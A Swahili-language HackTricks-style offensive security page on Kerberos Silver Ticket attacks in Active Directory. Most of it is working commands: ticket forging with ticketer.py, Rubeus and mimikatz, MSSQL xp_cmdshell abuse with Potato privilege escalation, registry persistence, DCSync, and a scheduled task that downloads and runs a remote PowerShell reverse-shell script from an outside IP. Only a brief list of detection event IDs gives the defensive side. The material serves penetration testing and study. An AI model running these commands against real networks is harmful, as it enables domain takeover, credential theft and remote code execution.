# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Shambulio la **Silver Ticket** linahusisha matumizi mabaya ya service tickets katika mazingira ya Active Directory (AD). Njia hii inategemea **kupata NTLM hash ya akaunti ya huduma**, kama vile akaunti ya kompyuta, ili kutengeneza Ticket Granting Service (TGS) ticket. Kwa tiketi hii iliyotengenezwa kwa ulaghai, mshambuliaji anaweza kupata huduma maalum kwenye mtandao, **kuigiza mtumiaji yoyote**, kwa kawaida akilenga vibali vya kiutawala. Inasisitizwa kwamba kutumia AES keys kwa kutengeneza tiketi ni salama zaidi na inayotambulika kwa ukosefu mdogo.

> [!WARNING]
> Silver Tickets ni ngumu kugunduliwa kuliko Golden Tickets kwa sababu zinahitaji tu **hash ya akaunti ya huduma**, si akaunti ya krbtgt. Hata hivyo, zina kikomo kwa huduma maalum wanayolenga. Pia, hata kuiba tu nenosiri la mtumiaji kunaweza kutosha.
> Zaidi ya hayo, ikiwa utapora **nenosiri la akaunti lenye SPN** unaweza kutumia nenosiri hilo kutengeneza Silver Ticket inayomfanya mtu awe mtumiaji yoyote kwa huduma hiyo.

Kwa kutengeneza tiketi, zana mbalimbali zinatumika kulingana na mfumo wa uendeshaji:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Kwenye Windows
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Huduma ya CIFS imeangaziwa kama lengo la kawaida la kupata mfumo wa faili wa mwathiriwa, lakini huduma nyingine kama HOST na RPCSS pia zinaweza kutumiwa kwa ajili ya kazi na maswali ya WMI.

### Mfano: huduma ya MSSQL (MSSQLSvc) + Potato hadi SYSTEM

Ikiwa una hash ya NTLM (au ufunguo wa AES) wa akaunti ya huduma ya SQL (mfano, sqlsvc), unaweza kutengeneza TGS kwa MSSQL SPN na kuiga mtumiaji yeyote kwa huduma ya SQL. Kutoka hapo, wezesha xp_cmdshell ili kutekeleza amri kama akaunti ya huduma ya SQL. Ikiwa token hiyo ina SeImpersonatePrivilege, fanya mnyororo wa Potato ili kuinua cheo hadi SYSTEM.
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Ikiwa muktadha uliopatikana una SeImpersonatePrivilege (mara nyingi kweli kwa service accounts), tumia Potato variant ili kupata SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Maelezo zaidi kuhusu kutumia MSSQL na kuwezesha xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Muhtasari wa mbinu za Potato:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Huduma Zinazopatikana

| Aina ya Huduma                            | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Kulingana na OS pia:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Kwa baadhi ya wakati unaweza kuomba tu: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Using **Rubeus** you may **ask for all** these tickets using the parameter:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Vitambulisho vya Tukio

- 4624: Kuingia kwa Akaunti
- 4634: Kutoka kwa Akaunti
- 4672: Kuingia kwa Admin

## Uendelevu

Ili kuzuia mashine zizungushe nywila zao kila 30 days weka `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` au unaweza kuweka `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` kuwa thamani kubwa kuliko 30days ili kuonyesha kipindi cha mzunguko ambapo nywila ya mashine inapaswa kugeuzwa.

## Kutumia tikiti za huduma

Katika mifano ifuatayo hebu tufikirie kuwa tikiti imetolewa kwa kuiga akaunti ya msimamizi.

### CIFS

Ukitumia tikiti hii utaweza kupata ufikivu kwenye folda `C$` na `ADMIN$` kupitia **SMB** (ikiwa zimefunuliwa) na kunakili faili kwenye sehemu ya mfumo wa faili ya mbali kwa kufanya kitu kama:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Pia utaweza kupata shell ndani ya host au kutekeleza amri zozote kwa kutumia **psexec**:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Kwa ruhusa hii unaweza kuunda scheduled tasks kwenye remote computers na execute arbitrary commands:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Kwa tiketi hizi unaweza **kutekeleza WMI katika mfumo wa mwathiri**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Pata **maelezo zaidi kuhusu wmiexec** kwenye ukurasa ufuatao:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Kwa ufikiaji wa winrm kwenye kompyuta unaweza **kuifikia** na hata kupata PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Angalia ukurasa ufuatao ili kujifunza **njia zaidi za kuunganisha na mwenyeji wa mbali kutumia winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Kumbuka kwamba **winrm lazima iwe hai na ikisikiliza** kwenye kompyuta ya mbali ili kuifikia.

### LDAP

Kwa ruhusa hii unaweza dump hifadhidata ya DC ukitumia **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Jifunze zaidi kuhusu DCSync** kwenye ukurasa ufuatao:


{{#ref}}
dcsync.md
{{#endref}}


## Marejeleo

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
